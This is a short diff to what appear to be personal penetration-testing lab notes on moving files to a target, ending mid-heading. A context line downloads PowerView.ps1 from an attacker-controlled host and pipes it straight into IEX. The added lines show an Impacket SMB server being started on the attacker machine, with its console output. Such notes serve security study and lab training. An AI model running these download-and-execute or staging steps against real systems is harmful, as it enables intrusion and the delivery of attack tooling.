@@ -109,3 +109,19 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX -UseBasicParsing
 ## SMB Downloads
 - SMB can be used from the target to download files from the attacker machine
 - `smbserver.py` from Impacket can be used to create a smb server in the attacker machine 
+
+#### Creating SMB Server
+```bash
+SonithGT@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+#### Copy f
